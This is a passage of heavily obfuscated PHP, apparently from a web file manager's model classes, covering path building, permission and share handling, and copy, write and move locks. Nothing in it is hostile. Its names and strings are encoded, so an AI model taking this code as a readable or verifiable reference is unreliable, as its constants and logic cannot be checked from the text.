(!$Ù½Ê‹õ[$æ¶‹™¨[499]] && !$ŞÕ—¸Àñ) { $Ù½Ê‹õ[$æ¶‹™¨[246]] = !1; $Ù½Ê‹õ[$æ¶‹™¨[245]] = !1; } } if ($Ù½Ê‹õ[$æ¶‹™¨[499]]) { $Ù½Ê‹õ[$æ¶‹™¨[246]] = AuthModel::authCheckEdit($Ù½Ê‹õ[$æ¶‹™¨[499]][$æ¶‹™¨[500]]); $Ù½Ê‹õ[$æ¶‹™¨[245]] = AuthModel::authCheckView($Ù½Ê‹õ[$æ¶‹™¨[499]][$æ¶‹™¨[500]]); } $this->groupPathDisplay($Ù½Ê‹õ); } unset($Ù½Ê‹õ); } public function _listAppendAuthSecret(&$ÏÅ¹òˆ›) { $œÙµĞÒ =& $_SERVER[Ò°Ì”İ•]; if (Model($œÙµĞÒ[520])->get($œÙµĞÒ[582]) != $œÙµĞÒ[102]) { return; } static $·¾Ÿ£Õ³ = false; if (!$·¾Ÿ£Õ³) { $çöº•ãÅ = Model($œÙµĞÒ[583]); $šõá–óé = Model($œÙµĞÒ[584]); $·¾Ÿ£Õ³ = $šõá–óé->listData(); $·¾Ÿ£Õ³ = array_to_keyvalue($·¾Ÿ£Õ³, $œÙµĞÒ[204]); $Ï©¾È³„ = json_decode(Model($œÙµĞÒ[520])->get($œÙµĞÒ[585]), !0); $Ï©¾È³„ = array_to_keyvalue($Ï©¾È³„, $œÙµĞÒ[487]); foreach ($·¾Ÿ£Õ³ as $ÔüÓŞ¡Ù => $À¼”šĞ…) { $á­óŞ¶Õ = $Ï©¾È³„[$À¼”šĞ…[$œÙµĞÒ[586]]]; if (!$á­óŞ¶Õ) { $šõá–óé->remove($À¼”šĞ…[$œÙµĞÒ[487]]); unset($·¾Ÿ£Õ³[$ÔüÓŞ¡Ù]); continue; } $şÑÙ = $çöº•ãÅ->listData($á­óŞ¶Õ[$œÙµĞÒ[499]]); if (!$şÑÙ) { $šõá–óé->remove($À¼”šĞ…[$œÙµĞÒ[487]]); unset($·¾Ÿ£Õ³[$ÔüÓŞ¡Ù]); continue; } $À¼”šĞ…[$œÙµĞÒ[499]] = $şÑÙ; $À¼”šĞ…[$œÙµĞÒ[587]] = $á­óŞ¶Õ; $À¼”šĞ…[$œÙµĞÒ[588]] = Model($œÙµĞÒ[589])->getInfoSimpleOuter($À¼”šĞ…[$œÙµĞÒ[539]]); $·¾Ÿ£Õ³[$ÔüÓŞ¡Ù] = $À¼”šĞ…; } } $ÃÑ¢õì = USER_ID; $êº©íÔ = array(); $„Æ‚âñƒ = $this->_listAppendPath($êº©íÔ, !0); foreach ($ÏÅ¹òˆ› as $ÔüÓŞ¡Ù => &$À¼”šĞ…) { if (!is_array($À¼”šĞ…[$œÙµĞÒ[499]])) { continue; } if ($À¼”šĞ…[$œÙµĞÒ[201]] != $œÙµĞÒ[590]) { continue; } if (isset($·¾Ÿ£Õ³[$À¼”šĞ…[$œÙµĞÒ[204]]])) { $Óß³»Å = $·¾Ÿ£Õ³[$À¼”šĞ…[$œÙµĞÒ[204]]]; if (!is_array($À¼”šĞ…[$œÙµĞÒ[551]])) { $À¼”šĞ…[$œÙµĞÒ[551]] = array(); } $À¼”šĞ…[$œÙµĞÒ[551]][$œÙµĞÒ[591]] = $Óß³»Å[$œÙµĞÒ[586]]; $À¼”šĞ…[$œÙµĞÒ[499]][$œÙµĞÒ[592]] = $Óß³»Å; $À¼”šĞ…[$œÙµĞÒ[499]][$œÙµĞÒ[593]] = $À¼”šĞ…[$œÙµĞÒ[594]]; $À¼”šĞ…[$œÙµĞÒ[499]][$œÙµĞÒ[595]] = $œÙµĞÒ[102]; if ($Óß³»Å[$œÙµĞÒ[539]] != $ÃÑ¢õì) { $À¼”šĞ…[$œÙµĞÒ[499]][$œÙµĞÒ[500]] = $À¼”šĞ…[$œÙµĞÒ[499]][$œÙµĞÒ[500]] & $Óß³»Å[$œÙµĞÒ[499]][$œÙµĞÒ[499]]; } continue; } $ ÎÓÅŠ‚ = $this->parentLevelArray($À¼”šĞ…[$œÙµĞÒ[596]]); $“‚€š•â = array_reverse($ ÎÓÅŠ‚); foreach ($“‚€š•â as $¿Õã³äë => $…ÉşŒ¥) { if (!isset($·¾Ÿ£Õ³[$…ÉşŒ¥])) { continue; } $Óß³»Å = $·¾Ÿ£Õ³[$…ÉşŒ¥]; $À¼”šĞ…[$œÙµĞÒ[499]][$œÙµĞÒ[592]] = $Óß³»Å; if ($Óß³»Å[$œÙµĞÒ[539]] != $ÃÑ¢õì) { $À¼”šĞ…[$œÙµĞÒ[499]][$œÙµĞÒ[500]] = $À¼”šĞ…[$œÙµĞÒ[499]][$œÙµĞÒ[500]] & $Óß³»Å[$œÙµĞÒ[499]][$œÙµĞÒ[499]]; } $¾¥ˆÃ´” = $œÙµĞÒ[12]; $•ğ¥õ² = count($ ÎÓÅŠ‚) - $¿Õã³äë; for ($’ÈôØ‡ = 0; $’ÈôØ‡ < $•ğ¥õ²; $’ÈôØ‡++) { if (!isset($„Æ‚âñƒ[$ ÎÓÅŠ‚[$’ÈôØ‡]])) { $¾¥ˆÃ´” = $œÙµĞÒ[12]; break; } $¾¥ˆÃ´” = $¾¥ˆÃ´” . rtrim($„Æ‚âñƒ[$ ÎÓÅŠ‚[$’ÈôØ‡]], $œÙµĞÒ[8]) . $œÙµĞÒ[8]; } $À¼”šĞ…[$œÙµĞÒ[499]][$œÙµĞÒ[593]] = rtrim($¾¥ˆÃ´”, $œÙµĞÒ[8]) . $œÙµĞÒ[8]; break; } } unset($À¼”šĞ…); } public function groupPathDisplay(&$¾ˆ÷¬•‚) { $¼¾¦éÜ¸ =& $_SERVER[Ò°Ì”İ•]; if ($¾ˆ÷¬•‚[$¼¾¦éÜ¸[201]] != self::TYPE_GROUP) { return; } $„æË©¦ = Model($¼¾¦éÜ¸[597])->getInfo($¾ˆ÷¬•‚[$¼¾¦éÜ¸[581]]); $¹¯‘Î…Ò = $this->parentLevelArray($„æË©¦[$¼¾¦éÜ¸[596]]); $Û¶ƒ¡âï = $¼¾¦éÜ¸[12]; foreach ($¹¯‘Î…Ò as $¨ò‰Ï·ê) { $Ã£Î¾› = Model($¼¾¦éÜ¸[597])->getInfo($¨ò‰Ï·ê); $Û¶ƒ¡âï .= $Ã£Î¾›[$¼¾¦éÜ¸[101]][$¼¾¦éÜ¸[204]] . $¼¾¦éÜ¸[50]; } $¾ˆ÷¬•‚[$¼¾¦éÜ¸[598]] = $„æË©¦[$¼¾¦éÜ¸[203]]; $¾ˆ÷¬•‚[$¼¾¦éÜ¸[599]] = $„æË©¦[$¼¾¦éÜ¸[596]]; $¾ˆ÷¬•‚[$¼¾¦éÜ¸[600]] = $„æË©¦[$¼¾¦éÜ¸[601]]; $¾ˆ÷¬•‚[$¼¾¦éÜ¸[602]] = $Û¶ƒ¡âï . $„æË©¦[$¼¾¦éÜ¸[101]][$¼¾¦éÜ¸[204]]; } protected function _listAppendPath(&$ÀÈÖÚšÌ, $’ú‰ûòû = false) { $ñ÷ÉšÇ× =& $_SERVER[Ò°Ì”İ•]; static $¦‡Ôù§Â = array(); $²¸ç¨¿” = array(); $ñ£ô»é÷ = array(); if ($’ú‰ûòû) { return $¦‡Ôù§Â; } foreach ($ÀÈÖÚšÌ as &$ÓÓŠÇƒ) { $üÙ™µÅò = $ÓÓŠÇƒ[$ñ÷ÉšÇ×[204]]; if ($ÓÓŠÇƒ[$ñ÷ÉšÇ×[497]] == $ñ÷ÉšÇ×[102] && $ÓÓŠÇƒ[$ñ÷ÉšÇ×[203]] != 0) { $¦‡Ôù§Â[$üÙ™µÅò] = $ÓÓŠÇƒ[$ñ÷ÉšÇ×[32]]; } if ($ÓÓŠÇƒ[$ñ÷ÉšÇ×[497]] == $ñ÷ÉšÇ×[102] && $ÓÓŠÇƒ[$ñ÷ÉšÇ×[203]] == 0) { $¦‡Ôù§Â[$üÙ™µÅò] = $this->_listAppendPathRoot($ÓÓŠÇƒ, array()); } if (isset($ñ£ô»é÷[$ÓÓŠÇƒ[$ñ÷ÉšÇ×[596]]])) { continue; } $ñ£ô»é÷[$ÓÓŠÇƒ[$ñ÷ÉšÇ×[596]]] = !0; $¥ìõÆâ› = $this->parentLevelArray($ÓÓŠÇƒ[$ñ÷ÉšÇ×[596]]); foreach ($¥ìõÆâ› as $¤‚¡ÌòÄ => $µ¡—‘Üú) { if (isset($¦‡Ôù§Â[$µ¡—‘Üú])) { continue; } if ($¤‚¡ÌòÄ == 0) { $¦‡Ôù§Â[$µ¡—‘Üú] = $this->_listAppendPathRoot($ÓÓŠÇƒ, $¥ìõÆâ›); } if ($¤‚¡ÌòÄ != 0) { $²¸ç¨¿”[] = $µ¡—‘Üú; } } } unset($ÓÓŠÇƒ); $²¸ç¨¿” = array_unique($²¸ç¨¿”); if (count($²¸ç¨¿”) > 0) { $Ò¦Ôş¼Ã = array($ñ÷ÉšÇ×[503] => array($ñ÷ÉšÇ×[504], $²¸ç¨¿”)); if (count($²¸ç¨¿”) == 1) { $Àïõ¼€É = $this->sourceInfo($²¸ç¨¿”[0]); $‘‹ËÜşè = is_array($Àïõ¼€É) ? array($Àïõ¼€É) : !1; } else { $‘‹ËÜşè = $this->field($ñ÷ÉšÇ×[603])->where($Ò¦Ôş¼Ã)->select(); } if (!$‘‹ËÜşè) { $‘‹ËÜşè = array(); } foreach ($‘‹ËÜşè as $’öì¿¬³) { $¦‡Ôù§Â[$’öì¿¬³[$ñ÷ÉšÇ×[204]]] = $’öì¿¬³[$ñ÷ÉšÇ×[32]]; } } $Ô‰¬ä¡ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $˜°êÆ“ = array(); foreach ($ÀÈÖÚšÌ as &$ÓÓŠÇƒ) { $’İîĞ–å = $ÓÓŠÇƒ[$ñ÷ÉšÇ×[596]]; $ù‹ÜÊÎ• = $ñ÷ÉšÇ×[12]; if (isset($˜°êÆ“[$’İîĞ–å])) { $ù‹ÜÊÎ• = $˜°êÆ“[$’İîĞ–å]; } else { $¥ìõÆâ› = $this->parentLevelArray($ÓÓŠÇƒ[$ñ÷ÉšÇ×[596]]); foreach ($¥ìõÆâ› as $¤‚¡ÌòÄ => $µ¡—‘Üú) { if (isset($¦‡Ôù§Â[$µ¡—‘Üú])) { $ù‹ÜÊÎ• .= $¦‡Ôù§Â[$µ¡—‘Üú] . $ñ÷ÉšÇ×[8]; } } $˜°êÆ“[$’İîĞ–å] = $ù‹ÜÊÎ•; } $ù‹ÜÊÎ• .= $ÓÓŠÇƒ[$ñ÷ÉšÇ×[32]]; if ($ÓÓŠÇƒ[$ñ÷ÉšÇ×[497]] == $ñ÷ÉšÇ×[102]) { $ù‹ÜÊÎ• .= $ñ÷ÉšÇ×[8]; } $ÓÓŠÇƒ[$ñ÷ÉšÇ×[594]] = str_replace($ñ÷ÉšÇ×[267], $ñ÷ÉšÇ×[8], $ù‹ÜÊÎ•); if ($ÓÓŠÇƒ[$ñ÷ÉšÇ×[203]] == $ñ÷ÉšÇ×[241]) { $ÓÓŠÇƒ[$ñ÷ÉšÇ×[32]] = trim($¦‡Ôù§Â[$ÓÓŠÇƒ[$ñ÷ÉšÇ×[204]]], $ñ÷ÉšÇ×[8]); $ÓÓŠÇƒ[$ñ÷ÉšÇ×[594]] = $ÓÓŠÇƒ[$ñ÷ÉšÇ×[32]] . $ñ÷ÉšÇ×[8]; } if (intval($ÓÓŠÇƒ[$ñ÷ÉšÇ×[201]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÓÓŠÇƒ, $¥ìõÆâ›, $Ô‰¬ä¡); } } unset($ÓÓŠÇƒ); return $ÀÈÖÚšÌ; } private function _listAppendPathRecycle(&$Å‰»¦ÀÖ, $¦È†û‡Û, $¼úåÁ×ó) { $ôÕ£©ë =& $_SERVER[Ò°Ì”İ•]; if (!in_array($¼úåÁ×ó, $¦È†û‡Û) && $Å‰»¦ÀÖ[$ôÕ£©ë[204]] != $¼úåÁ×ó) { return; } $¸îôÙ‰Ÿ = explode($ôÕ£©ë[8], trim($Å‰»¦ÀÖ[$ôÕ£©ë[594]], $ôÕ£©ë[8])); $ûÖÅºÃË = implode($ôÕ£©ë[8], array_slice($¸îôÙ‰Ÿ, 2)); $Å‰»¦ÀÖ[$ôÕ£©ë[594]] = $ôÕ£©ë[8] . LNG($ôÕ£©ë[604]) . $ôÕ£©ë[8] . ltrim($ûÖÅºÃË, $ôÕ£©ë[8]); $Å‰»¦ÀÖ[$ôÕ£©ë[596]] = $ôÕ£©ë[605] . implode($ôÕ£©ë[50], array_slice($¦È†û‡Û, 1)) . $ôÕ£©ë[50]; if ($Å‰»¦ÀÖ[$ôÕ£©ë[204]] == $¼úåÁ×ó) { $Å‰»¦ÀÖ[$ôÕ£©ë[596]] = $ôÕ£©ë[605]; $Å‰»¦ÀÖ[$ôÕ£©ë[203]] = $ôÕ£©ë[241]; $Å‰»¦ÀÖ[$ôÕ£©ë[32]] = LNG($ôÕ£©ë[604]); } $Å‰»¦ÀÖ[$ôÕ£©ë[606]] = $ôÕ£©ë[607]; } protected function _listAppendPathRoot(&$Ë£õõØÊ, $ñºÖÊ¢ş) { $ªäúéØ¬ =& $_SERVER[Ò°Ì”İ•]; static $ëßÉ ¢É = false; static $ŒöÒ”• = false; $šÔîñºÚ = $ªäúéØ¬[12]; if ($Ë£õõØÊ[$ªäúéØ¬[201]] == self::TYPE_USER) { if ($Ë£õõØÊ[$ªäúéØ¬[581]] == USER_ID) { $šÔîñºÚ = LNG($ªäúéØ¬[608]); if ($ëßÉ ¢É === !1) { $ÊÄÚş†ğ = Model($ªäúéØ¬[609])->getInfoFull(USER_ID); $ëßÉ ¢É = _get($ÊÄÚş†ğ, $ªäúéØ¬[610], $ªäúéØ¬[12]); } if ($ŒöÒ”• === !1) { $ÊÄÚş†ğ = Model($ªäúéØ¬[609])->getInfoFull(USER_ID); $ŒöÒ”• = _get($ÊÄÚş†ğ, $ªäúéØ¬[611], $ªäúéØ¬[12]); } if ($ñºÖÊ¢ş && $ñºÖÊ¢ş[0] == $ëßÉ ¢É || !$ñºÖÊ¢ş && $Ë£õõØÊ[$ªäúéØ¬[204]] == $ëßÉ ¢É) { $šÔîñºÚ = LNG($ªäúéØ¬[612]); $Ë£õõØÊ[$ªäúéØ¬[613]] = $ªäúéØ¬[614]; } if ($ñºÖÊ¢ş && $ñºÖÊ¢ş[0] == $ŒöÒ”• || !$ñºÖÊ¢ş && $Ë£õõØÊ[$ªäúéØ¬[204]] == $ŒöÒ”•) { $šÔîñºÚ = $šÔîñºÚ . $ªäúéØ¬[615] . LNG($ªäúéØ¬[616]); } if (!$ñºÖÊ¢ş) { $Ë£õõØÊ[$ªäúéØ¬[32]] = $šÔîñºÚ; } } else { $ÊÄÚş†ğ = Model($ªäúéØ¬[609])->getInfoFull($Ë£õõØÊ[$ªäúéØ¬[581]]); $ĞÆüÛ¤ò = _get($ÊÄÚş†ğ, $ªäúéØ¬[611], $ªäúéØ¬[12]); $Ë£õõØÊ[$ªäúéØ¬[617]] = Model($ªäúéØ¬[589])->getInfoSimpleOuter($Ë£õõØÊ[$ªäúéØ¬[581]]); $šÔîñºÚ = LNG($ªäúéØ¬[618]) . $ªäúéØ¬[187] . $Ë£õõØÊ[$ªäúéØ¬[617]][$ªäúéØ¬[32]] . $ªäúéØ¬[189]; if ($ñºÖÊ¢ş && $ñºÖÊ¢ş[0] == $ĞÆüÛ¤ò || !$ñºÖÊ¢ş && $Ë£õõØÊ[$ªäúéØ¬[204]] == $ĞÆüÛ¤ò) { $šÔîñºÚ = LNG($ªäúéØ¬[618]) . $ªäúéØ¬[619] . $Ë£õõØÊ[$ªäúéØ¬[617]][$ªäúéØ¬[32]] . $ªäúéØ¬[615] . LNG($ªäúéØ¬[616]) . $ªäúéØ¬[189]; } } } else { if ($Ë£õõØÊ[$ªäúéØ¬[201]] == self::TYPE_GROUP) { $¥Æ„ª„¤ = Model($ªäúéØ¬[597])->getInfoSimple($Ë£õõØÊ[$ªäúéØ¬[581]]); $šÔîñºÚ = $¥Æ„ª„¤[$ªäúéØ¬[32]]; } else { if ($Ë£õõØÊ[$ªäúéØ¬[201]] == self::TYPE_SYSTEM) { $šÔîñºÚ = $ªäúéØ¬[620]; } } } $šÔîñºÚ = $šÔîñºÚ ? $ªäúéØ¬[8] . $šÔîñºÚ . $ªäúéØ¬[8] : $ªäúéØ¬[8]; return $šÔîñºÚ; } protected function _listAppendUser(&$ÍÙ¸Ø•Ù) { $»¿——É“ =& $_SERVER[Ò°Ì”İ•]; $¦ºì•ÄĞ = array_to_keyvalue($ÍÙ¸Ø•Ù, $»¿——É“[12], $»¿——É“[539]); $ıöŠÄÃ— = array_to_keyvalue($ÍÙ¸Ø•Ù, $»¿——É“[12], $»¿——É“[541]); $…îÚÙÙ¼ = array_merge($¦ºì•ÄĞ, $ıöŠÄÃ—); $·À¯ç©Š = Model($»¿——É“[609])->userListInfo($…îÚÙÙ¼); foreach ($ÍÙ¸Ø•Ù as &$Ë¢µõÂÌ) { $Üõñ¼‹÷ = $Ë¢µõÂÌ[$»¿——É“[539]]; $Ë¢µõÂÌ[$»¿——É“[539]] = $·À¯ç©Š[$Üõñ¼‹÷] ? $·À¯ç©Š[$Üõñ¼‹÷] : !1; $Üõñ¼‹÷ = $Ë¢µõÂÌ[$»¿——É“[541]]; $Ë¢µõÂÌ[$»¿——É“[541]] = $·À¯ç©Š[$Üõñ¼‹÷] ? $·À¯ç©Š[$Üõñ¼‹÷] : !1; if (_get($Ë¢µõÂÌ, $»¿——É“[621], 0)) { $ëŞÙ¡Õ = $GLOBALS[$»¿——É“[6]][$»¿——É“[103]][$»¿——É“[622]]; if ($Ë¢µõÂÌ[$»¿——É“[551]][$»¿——É“[623]] <= time() - $ëŞÙ¡Õ) { $this->metaSet($Ë¢µõÂÌ[$»¿——É“[204]], $»¿——É“[624], null); $this->metaSet($Ë¢µõÂÌ[$»¿——É“[204]], $»¿——É“[623], null); unset($Ë¢µõÂÌ[$»¿——É“[551]][$»¿——É“[624]]); continue; } $šèİù– = $Ë¢µõÂÌ[$»¿——É“[551]][$»¿——É“[624]]; $Ë¢µõÂÌ[$»¿——É“[551]][$»¿——É“[625]] = Model($»¿——É“[609])->getInfoSimpleOuter($šèİù–); } } unset($Ë¢µõÂÌ); } public function parentLevelArray($ĞôÀ–üü) { $Àº»õ— =& $_SERVER[Ò°Ì”İ•]; $ĞôÀ–üü = explode($Àº»õ—[50], trim($ĞôÀ–üü, $Àº»õ—[50])); return array_remove_value($ĞôÀ–üü, $Àº»õ—[241]); } public function listAll($òÌ’ıä•) { $ßÏ‹Ù¤â =& $_SERVER[Ò°Ì”İ•]; $³¢÷Œ€Ù = $this->sourceInfo($òÌ’ıä•); $ôˆ¯²ñÊ = array($ßÏ‹Ù¤â[626] => array($ßÏ‹Ù¤â[627], $³¢÷Œ€Ù[$ßÏ‹Ù¤â[596]] . $òÌ’ıä• . $ßÏ‹Ù¤â[628]), $ßÏ‹Ù¤â[629] => 0); $ÉíÑ£¢Â = $ßÏ‹Ù¤â[630]; $Òœ¢Å€ = "\114\x45\106\124\40\112\x4f\111\x4e\x20{$this->tablePrefix}\151\x6f\137\x66\x69\x6c\x65\40\146\151\154\x65\x20\157\156\40\x73\x6f\x75\162\143\x65\x2e\x66\x69\154\x65\111\x44\40\75\x20\146\x69\154\x65\x2e\x66\151\154\x65\111\x44"; $˜µÈØ½ò = $this->alias($ßÏ‹Ù¤â[531])->field($ÉíÑ£¢Â)->where($ôˆ¯²ñÊ)->join($Òœ¢Å€)->select(); $this->_listAppendAuth($˜µÈØ½ò); $this->_listAppendUser($˜µÈØ½ò); $this->_listAppendPath($˜µÈØ½ò); $˜µÈØ½ò = array_to_keyvalue($˜µÈØ½ò, $ßÏ‹Ù¤â[204]); $÷³»´á = "\x2f{$³¢÷Œ€Ù[$ßÏ‹Ù¤â[32]]}\x2f"; $÷³»´á = $÷³»´á == $ßÏ‹Ù¤â[267] ? $ßÏ‹Ù¤â[8] : $÷³»´á; $Î‹›ñ¦Ç = array(); foreach ($˜µÈØ½ò as $ÇÎòšÏ» => $ÛŒúÁ×‰) { $µ™½š½ç = $this->parentLevelArray($ÛŒúÁ×‰[$ßÏ‹Ù¤â[596]]); array_shift($µ™½š½ç); $ö¸íèï• = $÷³»´á; for ($€É¦¸©Ò = 0; $€É¦¸©Ò < count($µ™½š½ç); $€É¦¸©Ò++) { $ö¸íèï• .= $˜µÈØ½ò[$µ™½š½ç[$€É¦¸©Ò]][$ßÏ‹Ù¤â[32]] . $ßÏ‹Ù¤â[8]; } $ö¸íèï• .= $ÛŒúÁ×‰[$ßÏ‹Ù¤â[32]]; if ($ÛŒúÁ×‰[$ßÏ‹Ù¤â[497]]) { $ö¸íèï• .= $ßÏ‹Ù¤â[8]; } $²ö·Ó¶ = array($ßÏ‹Ù¤â[507] => str_replace($ßÏ‹Ù¤â[267], $ßÏ‹Ù¤â[8], str_replace($ßÏ‹Ù¤â[267], $ßÏ‹Ù¤â[8], str_replace($ßÏ‹Ù¤â[267], $ßÏ‹Ù¤â[8], $ö¸íèï•))), $ßÏ‹Ù¤â[631] => intval($ÛŒúÁ×‰[$ßÏ‹Ù¤â[497]]), $ßÏ‹Ù¤â[632] => intval($ÛŒúÁ×‰[$ßÏ‹Ù¤â[90]]), $ßÏ‹Ù¤â[99] => intval($ÛŒúÁ×‰[$ßÏ‹Ù¤â[99]]), $ßÏ‹Ù¤â[101] => $this->pathInfoFilter($ÛŒúÁ×‰)); if (!$²ö·Ó¶[$ßÏ‹Ù¤â[497]]) { $²ö·Ó¶[$ßÏ‹Ù¤â[553]] = $ÛŒúÁ×‰[$ßÏ‹Ù¤â[553]]; } $Î‹›ñ¦Ç[] = $²ö·Ó¶; } $Î‹›ñ¦Ç = array_sort_by($Î‹›ñ¦Ç, $ßÏ‹Ù¤â[98]); return $Î‹›ñ¦Ç; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ŠÀ¬éÙù) { $ƒÏç’çû =& $_SERVER[Ò°Ì”İ•]; if (!$this->allowLock()) { return; } $this->_lockCheck($ƒÏç’çû[633], $ŠÀ¬éÙù); $¾îà²¥ = 1; $this->_lockEvent($ŠÀ¬éÙù, array($ƒÏç’çû[634], $ƒÏç’çû[635]), $¾îà²¥); $this->_lockParent($ŠÀ¬éÙù, array($ƒÏç’çû[635]), $¾îà²¥); $this->_lockEvent($ŠÀ¬éÙù, array($ƒÏç’çû[636], $ƒÏç’çû[637]), $¾îà²¥); $this->_lockCheckEnd($ƒÏç’çû[633], $ŠÀ¬éÙù); } public function lockCopyEnd($à¥ÊÓŒÁ) { $£ï×²¡ =& $_SERVER[Ò°Ì”İ•]; if (!$this->allowLock()) { return; } $ù š¶Ïá = 0; $this->_lockEvent($à¥ÊÓŒÁ, array($£ï×²¡[634], $£ï×²¡[635]), $ù š¶Ïá); $this->_lockParent($à¥ÊÓŒÁ, array($£ï×²¡[635]), $ù š¶Ïá); $this->_lockEvent($à¥ÊÓŒÁ, array($£ï×²¡[636], $£ï×²¡[637]), $ù š¶Ïá); } public function lockWriteStart($¸±íÔ¨Ï, $šêˆôæ¹ = '') { $íø‰‘ÙÃ =& $_SERVER[Ò°Ì”İ•]; if (!$this->allowLock()) { return; } $this->_lockCheck($íø‰‘ÙÃ[634], $¸±íÔ¨Ï); $Ÿ–ÛÜºÉ = 1; $this->_lockKey($íø‰‘ÙÃ[638] . $¸±íÔ¨Ï . $íø‰‘ÙÃ[10] . $šêˆôæ¹, $Ÿ–ÛÜºÉ); $this->_lockEvent($¸±íÔ¨Ï, array($íø‰‘ÙÃ[633], $íø‰‘ÙÃ[635]), $Ÿ–ÛÜºÉ); $this->_lockParent($¸±íÔ¨Ï, array($íø‰‘ÙÃ[633], $íø‰‘ÙÃ[635]), $Ÿ–ÛÜºÉ); $this->_lockCheckEnd($íø‰‘ÙÃ[634], $¸±íÔ¨Ï); } public function lockWriteEnd($Õ³ºşı±, $„ñ¦Ñô = '') { $ô°Ñ©á  =& $_SERVER[Ò°Ì”İ•]; if (!$this->allowLock()) { return; } $ê›¬Ûõ = 0; $this->_lockKey($ô°Ñ©á [638] . $Õ³ºşı± . $ô°Ñ©á [10] . $„ñ¦Ñô, $ê›¬Ûõ); $this->_lockEvent($Õ³ºşı±, array($ô°Ñ©á [633], $ô°Ñ©á [635]), $ê›¬Ûõ); $this->_lockParent($Õ³ºşı±, array($ô°Ñ©á [633], $ô°Ñ©á [635]), $ê›¬Ûõ); } public function lockMoveStart($ÆñÍ“ï) { $À¦ŒÙèó =& $_SERVER[Ò°Ì”İ•]; if (!$this->allowLock()) { return; } $this->_lockCheck($À¦ŒÙèó[635], $ÆñÍ“ï); $í“­»¤  = 1; $this->_lockKey($À¦ŒÙèó[639] . $ÆñÍ“ï, $í“­»¤ ); $this->_lockEvent($ÆñÍ“ï, array($À¦ŒÙèó[633], $À¦ŒÙèó[634]), $í“­»¤ ); $this->_lockParent($ÆñÍ“ï, array($À¦ŒÙèó[633], $À¦ŒÙèó[635]), $í“­»¤ ); $this->_lockEvent($ÆñÍ“ï, array($À¦ŒÙèó[640], $À¦ŒÙèó[636], $À¦ŒÙèó[637]), $í“­»¤ ); $this->_lockCheckEnd($À¦ŒÙèó[635], $ÆñÍ“ï); } public function lockMoveEnd($°¿­©ËÜ) { $ç§¯à¢ô =& $_SERVER[Ò°Ì”İ•]; if (!$this->allowLock()) { return; } $’ëïİ´Ò = 0; $this->_lockKey($ç§¯à¢ô[639] . $°¿­©ËÜ, $’ëïİ´Ò); $this->_lockEvent($°¿­©ËÜ, array($ç§¯à¢ô[633], $ç§¯à¢ô[634]), $’ëïİ´Ò); $this->_lockParent($°¿­©ËÜ, array($ç§¯à¢ô[633], $ç§¯à¢ô[635]), $’ëïİ´Ò); $this->_lockEvent($°¿­©ËÜ, array($ç§¯à¢ô[640], $ç§¯à¢ô[636], $ç§¯à¢ô[637]), $’ëïİ´Ò); } private function _lockCheck($æï£¬ó©, $¶…òŞŞ) { $”ï®¤çœ =& $_SERVER[Ò°Ì”İ•]; $µÃÎõˆû = $this->sourceInfo($¶…òŞŞ); $õ¥•òäù = $æï£¬ó© . $”ï®¤çœ[10] . $¶…òŞŞ; $this->_lockTimeStart[$õ¥•òäù] = timeFloat(); if (!is_array($µÃÎõˆû)) { return; } $ß—â™şÎ = LNG($”ï®¤çœ[641]); CacheLock::setErrorMsg($”ï®¤çœ[187] . htmlspecialchars($µÃÎõˆû[$”ï®¤çœ[32]]) . $”ï®¤çœ[189] . $ß—â™şÎ); $this->_lockKey($õ¥•òäù, 1); $this->_lockKey($õ¥•òäù, 0); $òï˜¬Ğ‡ = array_reverse($this->parentLevelArray($µÃÎõˆû[$”ï®¤çœ[596]])); foreach ($òï˜¬Ğ‡ as $“Šà©›®) { $õ¥•òäù = $æï£¬ó© . $”ï®¤çœ[642] . $“Šà©›®; if (CacheLock::lockGet($”ï®¤çœ[643] . $õ¥•òäù)) { $µÃÎõˆû = $this->sourceInfo($“Šà©›®); CacheLock::setErrorMsg($”ï®¤çœ[187] . htmlspecialchars($µÃÎõˆû[$”ï®¤çœ[32]]) . $”ï®¤çœ[189] . $ß—â™şÎ); $this->_lockKey($õ¥•òäù, 1); $this->_lockKey($õ¥•òäù, 0); } } } private function _lockCheckEnd($Üå’š, $ÔÑ¢±‘Ğ) { $€á¨Ï…™ =& $_SERVER[Ò°Ì”İ•]; $ÛãÓö¼… = $Üå’š . $€á¨Ï…™[10] . $ÔÑ¢±‘Ğ; CacheLock::setErrorMsg($€á¨Ï…™[466]); if (!isset($this->_lockTimeStart[$ÛãÓö¼…])) { return; } $¸İêİ×ğ = timeFloat() - $this->_lockTimeStart[$ÛãÓö¼…]; unset($this->_lockTimeStart[$ÛãÓö¼…]); if ($¸İêİ×ğ > 0.5) { unset(self::$cacheSourceInfo[$€á¨Ï…™[545] . $ÔÑ¢±‘Ğ]); } $ùæá¬ê = $this->sourceInfo($ÔÑ¢±‘Ğ); if (!$ùæá¬ê) { show_json(LNG($€á¨Ï…™[119]), !1); } } private function _lockParent($©êîãÒ, $Äéˆã², $£æãğä½) { if (!$this->autoLockSet) { return; } $âñÑ¬Œ— = $this->sourceInfo($©êîãÒ); if (!is_array($âñÑ¬Œ—)) { return; } $ÇÆÒÉˆù = array_reverse($this->parentLevelArray($âñÑ¬Œ—[$_SERVER[Ò°Ì”İ•][596]])); foreach ($ÇÆÒÉˆù as $¢£Åµµ•) { $this->_lockEvent($¢£Åµµ•, $Äéˆã², $£æãğä½); } } private function _lockEvent($Å°¨Ø„ˆ, $öµ¨½µ™, $™—ãËÉÃ) { $©ëº‹ùß =& $_SERVER[Ò°Ì”İ•]; if (!$this->autoLockSet) { return; } foreach ($öµ¨½µ™ as $åÆßèöœ) { $¨ñ¬¤±Î = $åÆßèöœ . $©ëº‹ùß[10] . $Å°¨Ø„ˆ; if ($™—ãËÉÃ && CacheLock::lockGet($©ëº‹ùß[643] . $¨ñ¬¤±Î)) { continue; } $this->_lockKey($¨ñ¬¤±Î, $™—ãËÉÃ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ô¨»šş‘, $¢ŸÉÃç = 1) { $±·Ã¸ÑĞ = $_SERVER[Ò°Ì”İ•][643] . md5($ô¨»šş‘); if ($¢ŸÉÃç) { if (isset(self::$_lockItemArr[$±·Ã¸ÑĞ])) { return; } self::$_lockItemArr[$±·Ã¸ÑĞ] = 1; CacheLock::lock($±·Ã¸ÑĞ, $this->_lockTime); } else { if 